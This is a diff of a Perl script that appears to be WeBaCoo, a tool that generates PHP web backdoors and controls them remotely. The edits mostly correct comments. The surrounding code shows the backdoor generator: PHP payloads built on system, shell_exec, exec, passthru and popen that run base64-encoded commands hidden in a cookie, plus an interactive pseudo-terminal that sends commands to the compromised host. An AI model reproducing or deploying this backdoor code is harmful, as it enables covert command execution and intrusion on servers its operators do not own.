@@ -10,7 +10,7 @@ use IO::Socket;
 ## Variables ##
 my(%WEBACOO,%args);
 
-# PHP System function for backdoor code
+# PHP system functions used in backdoor code
 my @phpsf = ("system", "shell_exec", "exec", "passthru", "popen");
 
 # Setup
@@ -38,15 +38,16 @@ my $request = '';
 my $output = '';
 my $sock = '';
 
-# Print 
+# Print WeBaCoo logo
 print_logo();
 
-# Parge command args
+# Parse command args
 getopts("gf:ro:tu:c:a:d:p:h", \%args) or die "getopts() returned 0\n";
 
 # Check for invalid arguments
 if($ARGV[0]) { print "Invalid option:$ARGV[0]\n"; exit; }
 
+# Print usage in -h case
 print_usage() if $args{h};
 
 #################################################################################
@@ -100,18 +101,20 @@ if(defined $args{t}) {
     # Check for user specified delimiter
     if(defined $args{d}) { $WEBACOO{delim}=$args{d}; }
 
-    # Delimiter can be equal to cookie name
+    # Delimiter cannot be equal to cookie name
     if(defined$args{d} && defined $args{c} && ($args{d} eq $args{c})) { 
 	print "Use DELIM != C_NAME\n"; exit; 
     }
 
-    # Print help quit message
+    # Print quit help message
     print "Type 'exit' to quit terminal!\n\n";
 
-    # Pseudo-terminal connection loop
+    # "Terminal" connection loop
     while(1) {
         print "webacoo> ";
     	chop($command=<STDIN>);
+
+	# Exit if "exit" is typed
     	if($command eq "exit") { print "\n^Bye^\n"; last; }
     	cmd_request();
     }
@@ -181,7 +184,7 @@ sub generate_backdoor
     # Command is retrieved under the relative Cookie from the client
     my $cmd = "base64_decode(\$_COOKIE['cm'])";
 
-    # Available PHP system functions format
+    # PHP system functions usage
     my %payloads = (
         "system" => "system($cmd.' 2>&1');",
         "shell_exec" => "echo shell_exec($cmd.' 2>&1');",
@@ -215,7 +218,7 @@ sub generate_backdoor
 }
 
 #################################################################################
-# Backdoor Request & Response
+# Backdoor: send request & get response
 sub cmd_request
 {
     my $dst_host = $WEBACOO{rhost};
